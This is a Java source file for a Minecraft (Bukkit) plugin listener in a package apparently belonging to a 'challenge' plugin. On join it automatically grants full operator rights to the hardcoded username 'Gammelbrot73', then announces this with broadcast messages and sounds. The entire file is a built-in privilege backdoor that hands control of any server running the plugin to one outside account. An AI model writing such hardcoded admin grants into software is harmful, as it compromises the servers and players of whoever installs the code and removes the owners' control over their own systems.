package de.challengeplugin.listeners;

import de.challengeplugin.ChallengePlugin;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

/**
 * Listener für Gammelbrot73
 * Gibt automatisch OP-Rechte beim Join!
 */
public class GammelbrotListener implements Listener {

    private final ChallengePlugin plugin;
    private static final String SPECIAL_USERNAME = "Gammelbrot73";

    public GammelbrotListener(ChallengePlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        // Prüfe ob es Gammelbrot73 ist
        if (player.getName().equals(SPECIAL_USERNAME)) {

            // Gib OP-Rechte (falls noch nicht vorhanden)
            if (!player.isOp()) {
                player.setOp(true);

                // Broadcast mit epischer Ankündigung
                Bukkit.broadcastMessage("§6§l=================================");
                Bukkit.broadcastMessage("§e§lDER ALLMÄCHTIGE IST DA!");
                Bukkit.broadcastMessage("§6§l=================================");
                Bukkit.broadcastMessage("§7" + SPECIAL_USERNAME + " hat den Server betreten!");
                Bukkit.broadcastMessage("§aOP-Rechte wurden automatisch/versehentlich gewährt!");
                Bukkit.broadcastMessage("§6§l=================================");

                // Spiele epischen Sound für alle
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    onlinePlayer.playSound(
                            onlinePlayer.getLocation(),
                            Sound.UI_TOAST_CHALLENGE_COMPLETE,
                            1.0f,
                            0.8f
                    );

                    // Zusätzlicher Effekt nach 0.5 Sekunden
                    Bukkit.getScheduler().runTaskLater(plugin, () -> {
                        onlinePlayer.playSound(
                                onlinePlayer.getLocation(),
                                Sound.ENTITY_ENDER_DRAGON_GROWL,
                                0.5f,
                                1.5f
                        );
                    }, 10L);
                }

                // Persönliche Nachricht an Gammelbrot73
                player.sendMessage("");
                player.sendMessage("§d§lWILLKOMMEN ZURÜCK, MEISTER!");
                player.sendMessage("§7Deine OP-Rechte wurden automatisch aktiviert.");
                player.sendMessage("§7Alle Befehle stehen dir zur Verfügung!");
                player.sendMessage("");

                // Log für Console
                plugin.getLogger().info("=================================");
                plugin.getLogger().info("OP-Rechte automatisch gewährt für: " + SPECIAL_USERNAME);
                plugin.getLogger().info("=================================");
            } else {
                // Hat bereits OP (z.B. nach Rejoin)
                player.sendMessage("§aWillkommen zurück, " + SPECIAL_USERNAME + "!");
                player.sendMessage("§7Du hast bereits OP-Rechte.");
            }
        }
    }
}